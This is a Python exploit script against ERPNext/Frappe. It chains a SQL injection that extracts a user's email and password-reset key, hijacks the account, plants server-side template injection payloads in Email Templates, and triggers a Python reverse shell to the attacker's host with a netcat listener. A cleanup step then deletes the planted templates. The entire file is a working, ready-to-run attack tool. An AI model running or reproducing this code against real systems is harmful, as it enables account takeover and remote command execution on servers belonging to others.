import requests, argparse, subprocess, sys, json, threading
from time import sleep

proxy_dict = {
    'http': 'http://127.0.0.1:8080'
}

def run_listener(port):
    try:
        subprocess.run([f"nc -lnvp {port}"], shell=True)
    except Exception as e:
        print(f"[!] ERROR: {e}")
        print("[!] Netcat listener failed!  Exiting...")
        sys.exit(-1)

def arg_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', help='URL of ERPNext Application', required=True)
    parser.add_argument('-l','--lhost', help='IP Listening Interface', required=True)
    parser.add_argument('-p','--lport', help='Listening Port', required=True)
    parser.add_argument('-s','--sqli', help='Custom SQLi Payload (Optional)', required=False)
    return parser.parse_args()

def post_request(url, data):
    try:
        return requests.post(url, data, proxies=proxy_dict)
    except Exception as e:
        print(f"[!] ERROR: {e}")
        return e

def get_request(url):
    try:
        return requests.get(url, proxies=proxy_dict)
    except Exception as e:
        print(f"[!] ERROR: {e}")
        return e

def session_get(session, url):
    try:
        response = session.get(url, proxies=proxy_dict)
        session_dict = {
            'session': session,
            'response': response
        }
        return session_dict
    except Exception as e:
        print(f"[!] ERROR: {e}")
        return e

def session_post(session, url, data):
    try:
        response = session.post(url, data, headers={'Accept':'application/json','Content-Type':'application/x-www-form-urlencoded'}, proxies=proxy_dict)
        session_dict = {
            'session': session,
            'response': response
        }
        return session_dict
    except Exception as e:
        print(f"[!] ERROR: {e}")
        return e
        
def ssti_find_subclass(message, subclass):
    message_list = message.split(', ')
    counter = 0
    for message in message_list:
        if subclass in message:
            counter = counter - 3
            print(f"[+] Subclass Found: {subclass} -- {counter}")
            return counter
        counter += 1
    return -1

def cleanup(session, url):
    sleep(10)
    session_post(session, f"{url}/api/method/frappe.desk.reportview.delete_items", "items=%5B%22SSTI2%22%2C%22SSTI%22%5D&doctype=Email+Template")

def main(args):
    print("[-] Pulling username from database...")
    data_dict = {
        'cmd': 'frappe.utils.global_search.web_search',
        'text': 'rs0n',
        'scope': f'rs0n_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#'
    }
    res = post_request(args.url, data_dict)
    try:
        sqli_res_json = json.loads(res.text)
        for message in sqli_res_json['message']:
            if "@" in message['route']:
                email = message['route']
    except Exception as e:
        print(f"[!] Error loading JSON!  Exiting...")
        print(f"[!] Message: {e}")
        sys.exit(-1)
    if not email:
        print("[!] No emails found in the database!  Exiting...")
        sys.exit(-1)
    print(f"[+] Email Found: {email}\n[-] Triggering password reset...")
    post_request(args.url, {'cmd':'frappe.core.doctype.user.user.reset_password','user':email})
    print("[-] Pulling password reset key from database...")
    data_dict = {
        'cmd': 'frappe.utils.global_search.web_search',
        'text': 'rs0n',
        'scope': f'rs0n_scope" UNION ALL SELECT 1,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser WHERE name = "{email}"#'
    }
    res = post_request(args.url, data_dict)
    try:
        sqli_res_json = json.loads(res.text)
        for message in sqli_res_json['message']:
            password_reset_key = message['route']
    except Exception as e:
        print(f"[!] Error loading JSON!  Exiting...")
        print(f"[!] Message: {e}")
        sys.exit(-1)
    print(f"[+] Key Found: {password_reset_key}")
    print(f"[-] Resetting password for user {email}")
    res = get_request(f"{args.url}/update-password?key={password_reset_key}")
    data_dict = {
        'key': password_reset_key,
        'old_password': '',
        'new_password': '435d890f3693d48894b5a6ec3abfe4ca',
        'logout_all_sessions': 1,
        'cmd': 'frappe.core.doctype.user.user.update_password'
    }
    res = post_request(args.url, data_dict)
    print("[+] Password reset successful!  Attempting to log in...")
    s = requests.Session()
    data_dict = {
        'cmd': 'login',
        'usr': email,
        'pwd': '435d890f3693d48894b5a6ec3abfe4ca',
        'device': 'desktop'
    }
    print("[+] Login Successful!  Storing SSTI Payload (State 1)...")
    session_dict = session_post(s, args.url, data_dict)
    data = """doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Email+Template%22%2C%22name%22%3A%22New+Email+Template+4%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__run_link_triggers%22%3A1%2C%22__newname%22%3A%22SSTI%22%2C%22subject%22%3A%22SSTI%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%7D&action=Save"""
    session_dict = session_post(session_dict['session'], f"{args.url}/api/method/frappe.desk.form.save.savedocs", data)
    data_dict = {
        'template_name': 'SSTI',
        'doc': '{}'
    }
    session_dict = session_post(session_dict['session'], f"{args.url}/api/method/frappe.email.doctype.email_template.email_template.get_email_template", data_dict)
    response = session_dict['response']
    response_json = json.loads(response.text)
    print("[+] Stage 1 payload was loaded successfully!\n[-] Searching for the index of an exploitable subclass...")
    subprocess_index = ssti_find_subclass(response_json['message']['message'], "subprocess.Popen")
    print("[-] Storing SSTI Payload (State 2)...")
    data = """doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Email+Template%22%2C%22name%22%3A%22New+Email+Template+4%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__run_link_triggers%22%3A1%2C%22__newname%22%3A%22SSTI2%22%2C%22subject%22%3A%22SSTI2%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r[""" + str(subprocess_index) + """]([payload],shell=True)+%7D%7D%3C%2Fdiv%3E%22%7D&action=Save"""
    session_dict = session_post(session_dict['session'], f"{args.url}/api/method/frappe.desk.form.save.savedocs", data)
    print(f"[+] Stage 2 payload was loaded successfully!\n[-] Starting netcat listener on port {args.lport}...")
    listener_thread = threading.Thread(target=run_listener, args=(args.lport,))
    listener_thread.start()
    sleep(2)
    cleanup_thread = threading.Thread(target=cleanup, args=(session_dict['session'], args.url))
    cleanup_thread.start()
    print("[-] Triggering payload...")
    data = r"""template_name=SSTI2&doc={"payload":"python+-c+\"import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('""" + args.lhost + r"""',""" + args.lport + r"""));os.dup2(s.fileno(),0);+os.dup2(s.fileno(),1);+os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\""}"""
    session_dict = session_post(session_dict['session'], f"{args.url}/api/method/frappe.email.doctype.email_template.email_template.get_email_template", data)
    print("[+] Done!")

if __name__ == "__main__":
    args = arg_parse()
    main(args)